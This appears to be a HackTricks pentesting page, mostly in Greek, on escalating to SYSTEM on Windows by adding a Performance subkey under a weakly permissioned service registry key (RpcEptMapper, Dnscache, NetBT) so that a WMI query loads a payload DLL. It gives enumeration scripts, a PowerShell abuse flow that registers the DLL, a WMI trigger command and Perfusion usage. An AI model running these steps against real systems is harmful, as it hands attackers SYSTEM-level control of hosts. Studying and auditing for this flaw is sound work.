# AppendData/AddSubdirectory Permission over Service Registry

{{#include ../../banners/hacktricks-training.md}}

**The original post is** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)

## Περίληψη

Αν έχετε μόνο **`Create Subkey`** / **`AppendData/AddSubdirectory`** σε ένα service registry key, αυτό παραμένει μια καλή ένδειξη για privesc. Συνήθως **δεν μπορείτε** να αντικαταστήσετε απευθείας τα `ImagePath`, `ServiceDll` ή άλλες υπάρχουσες τιμές, αλλά ίσως μπορείτε ακόμα να δημιουργήσετε ένα θυγατρικό κλειδί **`Performance`** κάτω από:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Οποιοδήποτε άλλο **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** key όπου το token σας έχει **`KEY_CREATE_SUB_KEY`**

Το κόλπο είναι ότι τα Windows εξακολουθούν να υποστηρίζουν το παλιό μοντέλο εγγραφής **PerfLib V1**. Αν ένα service έχει ένα **`Performance`** subkey, τα Windows μπορούν να φορτώσουν ένα DLL από εκεί όταν ένας consumer του performance counter ζητήσει δεδομένα.

Σύμφωνα με τη Microsoft documentation, η ελάχιστη εγγραφή είναι:
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Άρα το βασικό συμπέρασμα για offensive χρήση είναι: **μην απορρίπτεις ένα service registry finding μόνο επειδή πήρες `CreateSubKey` αντί για `SetValue`**.

## Γιατί αυτό αρκεί για code execution

Το subkey `Performance` συνήθως **δεν** υπάρχει by default σε αυτά τα services, οπότε το **`KEY_CREATE_SUB_KEY`** είναι το primitive που χρειάζεσαι. Μόλις το key υπάρξει και περιέχει `Library`/`Open`/`Collect`/`Close`, οποιοσδήποτε **performance counter consumer** μπορεί να trigger το DLL load.

Μερικές σημαντικές λεπτομέρειες:

- Η τιμή **`Library`** μπορεί να δείχνει σε **full DLL path**.
- Το DLL πρέπει να κάνει export τα **`OpenPerfData`**, **`CollectPerfData`** και **`ClosePerfData`** και να επιστρέφει `ERROR_SUCCESS`.
- Ο code εκτελείται στο **context του consumer**, **όχι απαραίτητα μέσα στο vulnerable service process**.
- Στην κλασική περίπτωση `RpcEptMapper` / `Dnscache`, ένα **WMI performance query** μπορεί να κάνει το **`wmiprvse.exe`** να φορτώσει το DLL ως **`NT AUTHORITY\SYSTEM`**.

Γι’ αυτό το primitive είναι εύκολο να ξεφύγει κατά το triage: το parent service key δεν είναι "fully writable", αλλά παραμένει weaponizable.

## Γρήγορη enumeration

Χειροκίνητο spot-check με **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Παράδειγμα PowerShell για να αναζητήσετε principals με χαμηλά δικαιώματα που έχουν **`CreateSubKey`** σε service keys:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Χρήσιμα εργαλεία:

- **PrivescCheck**: το `Get-ModifiableRegistryPath` δημιουργήθηκε ειδικά για να εντοπίζει αυτή την κατηγορία ζητήματος.
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: αυτοματοποιεί DLL drop, `Performance` registration, WMI trigger, token duplication, και cleanup σε legacy vulnerable targets (για παράδειγμα: `Perfusion.exe -c cmd -i -k Dnscache`).

## Abuse flow

Δημιούργησε το subkey `Performance` και συμπλήρωσε τις απαιτούμενες τιμές:
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Στη συνέχεια ενεργοποίησε έναν **privileged** performance consumer. Ένα κλασικό παράδειγμα είναι ένα WMI query πάνω σε `Win32_Perf*` classes:
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Operational notes:

- Η εκκίνηση του **`perfmon.exe`** είναι χρήσιμη για να επαληθεύσεις ότι η καταχώριση του counter είναι σωστή, αλλά συνήθως αυτό φορτώνει μόνο το DLL στο **δικό σου user context**.
- Για πραγματικό LPE, ενεργοποίησε έναν **privileged** consumer όπως το **WMI**.
- Αν γράφεις το δικό σου exploit, το να κάνεις spawn το `cmd.exe` απευθείας από μέσα στο DLL συνήθως σε αφήνει με shell στο **session 0**. Το **`Perfusion`** το λύνει αυτό αντιγράφοντας το privileged token σε μια διεργασία που δημιουργήθηκε suspended στη session του επιτιθέμενου.
- Ταίριαξε την αρχιτεκτονική του DLL με το target consumer (**x64 σε x64 συστήματα**).

## Version notes / recent developments

Ιστορικά, τα built-in weak keys ήταν τα εξής:

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` και `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

Το **`Perfusion`** σημειώνει ότι τα updates του **April 2021** αφαίρεσαν το εύκολο exploitation path στα ενημερωμένα **Windows 8 / Windows Server 2012**, ενώ τα **Windows 7 / Windows Server 2008 R2** παρέμειναν exploitable μέσω του **`Dnscache`**.

Αυτό το primitive **δεν είναι μόνο ιστορικό**. Τον **January 2025**, η Microsoft patched ένα σχετικό AD DS issue όπου μέλη των **`Network Configuration Operators`** μπορούσαν να δημιουργούν subkeys κάτω από τα **`Dnscache`** και **`NetBT`**, και η ίδια ιδέα **Performance-counter DLL registration** μπορούσε να επαναχρησιμοποιηθεί για να φτάσει σε **SYSTEM** σε supported systems.

Άρα το σύγχρονο μάθημα είναι γενικό: κάθε φορά που ένας low-privileged principal έχει **`CreateSubKey`** στο **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, έλεγξε αν ένα child key **`Performance`** αρκεί πριν απορρίψεις το finding.

## References

- [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
{{#include ../../banners/hacktricks-training.md}}
